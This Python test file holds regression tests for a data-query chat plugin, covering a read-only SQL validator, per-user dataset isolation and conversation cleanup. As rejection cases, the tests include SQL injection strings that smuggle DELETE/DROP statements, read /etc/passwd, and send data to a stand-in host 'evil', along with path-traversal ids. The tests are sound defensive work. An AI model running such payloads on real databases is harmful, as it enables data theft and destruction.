"""Defects found by the independent review of the plugin (each test failed before its fix)."""
import asyncio
import os
import unittest
from types import SimpleNamespace
from unittest import mock

m = support = f = None


def setUpModule():
    global m, support, f
    import support as support_module
    support = support_module
    m = support.load()
    f = m.fakes


class SettingsOfTheAgentTest(unittest.TestCase):
    def test_the_query_agent_reads_the_settings_of_its_agent(self):
        # regression: without the agent, the core looked for it in the call stack and found the QueryCatAgent (it has
        # a large_language_model but no agent_key): every tenant read the settings of the system agent
        requested = []

        async def get_setting(agent_id, plugin_id):
            requested.append(agent_id)
            return None

        cat = f.make_cat(agent_key="tenant-a")
        cat.mad_hatter = SimpleNamespace(get_plugin=lambda: m.plugin)
        with mock.patch.object(m.settings.crud_plugins, "get_setting", get_setting):
            support.run(m.query_agent.QueryCatAgent(cat)._load_configurations())
            support.run(m.query_cat._plugin_settings(cat))
        self.assertEqual(requested, ["tenant-a", "tenant-a"])


class ReadOnlyBypassTest(unittest.TestCase):
    def test_quoting_tricks_are_refused(self):
        # regression: dollar quoting (PostgreSQL), backslash escapes (MySQL, PostgreSQL E'') and "#" comments (MySQL)
        # made the validator see a string literal where the database sees statements
        for sql in (
            "SELECT $$'$$; COMMIT; BEGIN READ WRITE; DELETE FROM t WHERE x = 1; COMMIT; SELECT $$'$$",
            "SELECT $tag$'$tag$; DROP TABLE t; SELECT $tag$'$tag$",
            "SELECT 'x\\'', 1 INTO OUTFILE '/tmp/x' -- '",
            "SELECT E'\\'' ; DELETE FROM t; SELECT ''",
            "SELECT 1 # '\n; DELETE FROM t; -- '",
        ):
            with self.subTest(sql=sql), self.assertRaises(ValueError):
                m.data_engine.validate_read_only(sql)

    def test_ordinary_queries_are_accepted(self):
        for sql in ("SELECT '$100' AS price", "SELECT a FROM t WHERE b LIKE '%x%'", "SELECT a FROM t WHERE id = 1",
                    'SELECT "a b" FROM t', "WITH x AS (SELECT 1 AS v) SELECT v FROM x"):
            with self.subTest(sql=sql):
                self.assertEqual(m.data_engine.validate_read_only(sql), sql)

    def test_side_effects_in_a_select_are_refused(self):
        # regression: a SELECT can still act outside the data (wait, lock, read files of the server, call other
        # servers, change sequences and settings); the statement is parsed as the database of the datasource reads it
        for dialect, sql in (
            ("postgresql", "SELECT pg_sleep(30)"),
            ("postgresql", "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(a int)"),
            ("postgresql", "SELECT nextval('orders_id_seq')"),
            ("postgresql", "SELECT set_config('search_path', 'x', false)"),
            ("postgresql", "SELECT pg_read_file('/etc/passwd')"),
            ("postgresql", "SELECT * FROM orders FOR UPDATE"),
            ("oracle", "SELECT UTL_HTTP.REQUEST('http://evil/' || name) FROM customers"),
            ("oracle", "SELECT DBMS_PIPE.RECEIVE_MESSAGE('a', 30) FROM dual"),
            ("mysql", "SELECT LOAD_FILE('/etc/passwd')"),
            ("mysql", "SELECT BENCHMARK(100000000, MD5('x'))"),
            ("mysql", "SELECT SLEEP(30)"),
            ("mssql", "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=evil;', 'SELECT 1')"),
            ("sqlite", "SELECT a FROM t WHERE"),  # not a statement of the database
        ):
            with self.subTest(dialect=dialect, sql=sql), self.assertRaises(ValueError):
                m.data_engine.validate_read_only(sql, dialect)

    def test_queries_of_every_database_are_accepted(self):
        for dialect, sql in (
            ("postgresql", "SELECT name FROM customers WHERE name ILIKE 'a%' ORDER BY 1 LIMIT 5"),
            ("postgresql", "SELECT date_trunc('month', created_at) AS m, COUNT(*) FROM orders GROUP BY 1"),
            ("mysql", "SELECT `name`, COUNT(*) FROM `orders` GROUP BY `name`"),
            ("oracle", "SELECT name FROM customers FETCH FIRST 5 ROWS ONLY"),
            ("mssql", "SELECT TOP 5 [name] FROM [customers]"),
            ("sqlite", "SELECT strftime('%Y', d) AS y, SUM(v) FROM t GROUP BY y"),
            ("postgresql", "SELECT a FROM t UNION SELECT b FROM u"),
            (None, "SELECT 1"),
        ):
            with self.subTest(dialect=dialect, sql=sql):
                self.assertEqual(m.data_engine.validate_read_only(sql, dialect), sql)

    def test_the_dialect_of_the_datasource_is_used(self):
        engine = m.data_engine.engine_from_bytes(support.sqlite_bytes({"t": (["v"], [(1,)])}))
        try:
            real = m.data_engine.validate_read_only
            with mock.patch.object(m.data_engine, "validate_read_only", wraps=real) as chart_check, \
                    mock.patch.object(m.query_agent, "validate_read_only", wraps=real) as tool_check:
                m.data_engine.run_select(engine, "SELECT v FROM t", 5)
                m.query_agent.ReadOnlyQuerySQLDatabaseTool(db=m.data_engine.sql_database(engine, cache=False))._run("SELECT v FROM t")
            self.assertEqual([c.args[1] for c in chart_check.call_args_list + tool_check.call_args_list], ["sqlite", "sqlite"])
        finally:
            engine.dispose()


class RabbitHoleFailureTest(unittest.TestCase):
    def test_a_dataset_that_cannot_be_stored_is_not_described_in_the_memory(self):
        # regression: with the default file manager of the core (it keeps nothing) the description of the dataset went
        # into the memory as queryable, and the user was not told
        from langchain_core.documents import Document
        from cat import StrayCat

        cat = mock.MagicMock(spec=StrayCat)
        cat.agent_key, cat.id, cat.user = "agent-rh", "chat-rh", SimpleNamespace(id="user-rh")
        cat.file_manager = f.DummyFileManager()
        plugin = SimpleNamespace(load_settings=mock.AsyncMock(return_value=support.default_settings()))
        cat.mad_hatter = SimpleNamespace(get_plugin=lambda: plugin)
        cat.notifier = SimpleNamespace(send_notification=mock.AsyncMock(), send_error=mock.AsyncMock())
        docs = [
            Document(page_content="Dataset 'a.csv'", metadata={m.parsers.KIND_KEY: "csv", m.parsers.NAME_KEY: "a.csv",
                                                                m.parsers.PAYLOAD_KEY: b"v\n1\n"}),
            Document(page_content="other text", metadata={"source": "notes.txt"}),
        ]
        result = support.run(m.query_cat.before_rabbithole_splits_documents.function(docs, cat))
        self.assertEqual([d.page_content for d in result], ["other text"])
        cat.notifier.send_error.assert_awaited_once()
        self.assertIn("configure a file manager", cat.notifier.send_error.await_args.args[0])


    def test_a_shared_dataset_that_cannot_be_stored(self):
        # without a conversation (upload for the whole agent) there is nobody to notify: the document is dropped
        from langchain_core.documents import Document

        plugin = SimpleNamespace(load_settings=mock.AsyncMock(return_value=support.default_settings()))
        cat = SimpleNamespace(agent_key="agent-rh2", file_manager=f.DummyFileManager(),
                              mad_hatter=SimpleNamespace(get_plugin=lambda: plugin))
        docs = [Document(page_content="Dataset 'a.csv'", metadata={
            m.parsers.KIND_KEY: "csv", m.parsers.NAME_KEY: "a.csv", m.parsers.PAYLOAD_KEY: b"v\n1\n"})]
        self.assertEqual(support.run(m.query_cat.before_rabbithole_splits_documents.function(docs, cat)), [])


class IncompleteCopyCacheTest(unittest.TestCase):
    def test_an_interrupted_upload_does_not_disable_the_cache(self):
        # regression: a copy being written (or interrupted) prevented the cache of the workspace, for ever
        fm = f.ObjectStoreFileManager()
        store = m.datasets.DatasetStore(fm, "agent-cache", "chat", "u1")
        store.add("a.csv", b"v\n1\n")
        store.add("b.csv", b"v\n2\n")
        folder = store.chat_dir
        stored = store._new_stored_name(folder, "a.csv", b"v\n3\n")
        fm.write_file(b"v\n", stored, folder)  # incomplete
        first = store.workspace()
        with mock.patch.object(m.datasets, "build_workspace", side_effect=AssertionError("rebuilt")):
            self.assertIs(store.workspace(), first)
        fm.write_file(b"v\n3\n", stored, folder)  # the upload completes: the new content is used
        self.assertIsNot(store.workspace(), first)



class ConversationDeletionTest(unittest.TestCase):
    """The core removes the folder ``<agent>/<chat>`` of a conversation when the conversation is deleted."""

    def setUp(self):
        self.fm = f.ObjectStoreFileManager()
        self.agent = f"agent-{id(self)}"

    def core_deletes_conversation(self, chat_id):
        # as cat/core_plugins/conversation_history/endpoints.py (delete_conversation) does
        self.fm.remove_folder(f"{self.agent}/{chat_id}")

    def test_deleting_any_conversation_keeps_the_shared_datasets(self):
        # regression: the shared datasets were in <agent>/cat_with_your_data, the folder of the conversation with that
        # id: deleting it (MEMORY/DELETE) removed the shared datasets of every conversation of the agent
        m.datasets.DatasetStore(self.fm, self.agent).add("shared.csv", b"v\n1\n")
        for chat_id in ("cat_with_your_data", "_chats", "system", "c1"):
            self.core_deletes_conversation(chat_id)
        self.assertEqual([d.name for d in m.datasets.DatasetStore(self.fm, self.agent).list_datasets()], ["shared.csv"])

    def test_the_datasets_of_a_conversation_go_with_it(self):
        # regression: the conversations with ids that are not simple names had their datasets under a hash of the id:
        # deleting the conversation left them behind
        for chat_id in ("c1", "chat with spaces", "x" * 200, "è-unicode"):
            with self.subTest(chat_id=chat_id):
                store = m.datasets.DatasetStore(self.fm, self.agent, chat_id, "u1")
                store.add("mine.csv", b"v\n1\n")
                self.core_deletes_conversation(chat_id)
                self.assertEqual(store.list_datasets(), [])
                self.assertEqual([k for k in self.fm.objects if "--mine.csv" in k], [])

    def test_ids_that_are_not_folder_names_have_no_datasets_of_their_own(self):
        # otherwise "a/../../other-agent" would write in the folder of another agent
        m.datasets.DatasetStore(self.fm, self.agent).add("shared.csv", b"v\n1\n")
        for chat_id in ("a/../../other-agent", "..", ".", "a\\b"):
            with self.subTest(chat_id=chat_id):
                store = m.datasets.DatasetStore(self.fm, self.agent, chat_id, "u1")
                with self.assertRaises(m.datasets.DatasetError):
                    store.add("mine.csv", b"v\n1\n")
                self.assertEqual([d.name for d in store.list_datasets()], ["shared.csv"])
                store.mark_used()
        stored = [os.path.relpath(k, self.fm._root_dir) for k in self.fm.objects]
        self.assertTrue(all(k.startswith("system/") for k in stored), stored)

    def test_destroyed_agent_loses_its_shared_datasets_only(self):
        m.datasets.DatasetStore(self.fm, self.agent).add("a.csv", b"v\n1\n")
        m.datasets.DatasetStore(self.fm, f"{self.agent}-other").add("b.csv", b"v\n1\n")
        destroyed = SimpleNamespace(file_manager=self.fm)
        support.run(m.query_cat.after_cheshire_cat_destroy.function(self.agent, destroyed))
        self.assertEqual(m.datasets.DatasetStore(self.fm, self.agent).list_datasets(), [])
        self.assertEqual([d.name for d in m.datasets.DatasetStore(self.fm, f"{self.agent}-other").list_datasets()], ["b.csv"])
        broken = SimpleNamespace(file_manager=SimpleNamespace(remove_folder=mock.Mock(side_effect=OSError("down"))))
        support.run(m.query_cat.after_cheshire_cat_destroy.function(self.agent, broken))  # logged


class UsersOfAConversationTest(unittest.TestCase):
    def test_users_with_the_same_chat_id_do_not_share_datasets(self):
        # regression: the chat id is chosen by the client; a user writing in the chat id of another one saw (and could
        # remove) the other's datasets
        fm, agent = f.ObjectStoreFileManager(), f"agent-{id(self)}"
        mine, theirs = (m.datasets.DatasetStore(fm, agent, "c1", user) for user in ("u1", "u2"))
        mine.add("private.csv", b"v\n1\n")
        self.assertEqual(theirs.list_datasets(), [])
        self.assertIsNone(theirs.workspace())
        self.assertFalse(theirs.remove("private.csv"))
        self.assertEqual([d.name for d in mine.list_datasets()], ["private.csv"])

    def test_the_query_agent_uses_the_datasets_of_the_user(self):
        fm, agent = f.ObjectStoreFileManager(), f"agent-{id(self)}"
        m.datasets.DatasetStore(fm, agent, "c1", "u1").add("private.csv", b"v\n1\n")
        cat = f.make_cat(agent_key=agent, chat_id="c1", user_id="u2", file_manager=fm)
        self.assertIsNone(m.query_agent.QueryCatAgent(cat)._uploaded_datasets_engine())


class HistoryTest(unittest.TestCase):
    def test_the_answer_is_stored_once_and_without_charts(self):
        # regression (with the core running the hooks of the turn after an agent fast reply): the plugin stored the
        # answer too, so it was in the history twice
        settings = support.default_settings(ds_type="CSV", host="sales.csv")
        cat = f.make_cat(f.ScriptedChatModel(script=[f.tool_call("draw_chart", {
            "sql": "SELECT region, amount FROM sales", "chart_type": "bar", "x": "region", "y": ["amount"], "title": "T"
        }), f.AIMessage(content="N leads")]), settings, workflow=f.Workflow(output="Here"), agent_key=f"agent-{id(self)}")
        support.put_file(cat.agent_key, "sales.csv", b"region,amount\nN,2\nS,1\n")
        output = support.run(m.query_cat.agent_fast_reply.function(cat))
        self.assertEqual(cat.working_memory.history, [], "the core stores the answer")
        sent = support.core_sends(cat, output)
        self.assertIn("data:image/png;base64,", sent.text)
        self.assertEqual([(i.who, i.content.text) for i in cat.working_memory.history], [("assistant", "Here\n\n[chart: T]")])

    def test_the_history_is_left_alone_otherwise(self):
        cat = f.make_cat(history=[f.message("user", "q")])
        message = SimpleNamespace(text="x")
        with mock.patch.object(m.query_cat.crud_conversations, "set_messages", side_effect=AssertionError("written")):
            self.assertIs(support.run(m.query_cat.before_cat_sends_message.function(message, None, cat)), message)
            cat.working_memory.history.append(f.message("assistant", "no charts"))
            support.run(m.query_cat.before_cat_sends_message.function(message, None, cat))
        chart = m.charts.chart_markdown_inline(b"png", "C")
        cat.working_memory.history.append(f.message("assistant", f"a {chart}"))
        with mock.patch.object(m.query_cat.crud_conversations, "set_messages", side_effect=RuntimeError("redis down")):
            self.assertIs(support.run(m.query_cat.before_cat_sends_message.function(message, None, cat)), message)



class GuardBlockTest(unittest.TestCase):
    def test_a_message_blocked_by_the_guard_is_not_worked_on(self):
        # regression: the agent queried the data (and called the LLM) on a message that guard-plugin then blocked
        cat = f.make_cat(f.ScriptedChatModel(script=[]), support.default_settings(ds_type="CSV", host="sales.csv"))
        cat.working_memory.guard_blocked = id(cat.working_memory.user_message)
        with mock.patch.object(m.query_cat, "QueryCatAgent", side_effect=AssertionError("worked on")):
            self.assertIsNone(support.run(m.query_cat.agent_fast_reply.function(cat)))


if __name__ == "__main__":
    unittest.main()
